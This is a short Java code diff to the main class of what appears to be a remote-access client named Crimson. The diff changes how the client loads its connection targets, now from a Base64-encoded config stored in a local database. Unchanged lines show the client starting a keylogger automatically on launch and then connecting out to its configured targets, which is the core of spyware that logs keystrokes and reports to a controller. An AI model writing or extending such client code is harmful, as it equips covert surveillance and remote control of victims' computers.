@@ -18,7 +18,6 @@
 package com.subterranean_security.crimson.client;
 
 import java.io.File;
-import java.util.List;
 
 import org.slf4j.Logger;
 import org.slf4j.LoggerFactory;
@@ -27,8 +26,9 @@ import com.subterranean_security.crimson.client.modules.Keylogger;
 import com.subterranean_security.crimson.client.modules.Keylogger.RefreshMethod;
 import com.subterranean_security.crimson.core.Common;
 import com.subterranean_security.crimson.core.Platform;
-import com.subterranean_security.crimson.core.proto.Generator.NetworkTarget;
+import com.subterranean_security.crimson.core.proto.Generator.ClientConfig;
 import com.subterranean_security.crimson.core.storage.ClientDB;
+import com.subterranean_security.crimson.core.util.B64;
 import com.subterranean_security.crimson.core.util.CUtil;
 import com.subterranean_security.crimson.core.util.EH;
 
@@ -36,6 +36,7 @@ public class Client {
 	private static final Logger log = LoggerFactory.getLogger(Client.class);
 
 	public static ClientDB clientDB;
+	public static ClientConfig ic;
 
 	public static void main(String[] args) {
 
@@ -55,8 +56,7 @@ public class Client {
 
 		try {
 			clientDB = new ClientDB(new File(Common.Directories.base + "/var/client.db"));
-			ClientStore.Connections.setTargets((List<NetworkTarget>) clientDB.getObject("nts"));
-			ClientStore.Connections.setPeriod(clientDB.getInteger("reconnect_period"));
+			ic = ClientConfig.parseFrom(B64.decode(clientDB.getString("ic")));
 		} catch (Exception e) {
 			// TODO: handle exception
 			System.out.println("Database error");
@@ -71,6 +71,8 @@ public class Client {
 
 		Keylogger.start(RefreshMethod.TIME, 20000);
 
+		ClientStore.Connections.setTargets(ic.getTargetList());
+		ClientStore.Connections.setPeriod(ic.getReconnectPeriod());
 		ClientStore.Connections.connectionRoutine();
 
 	}
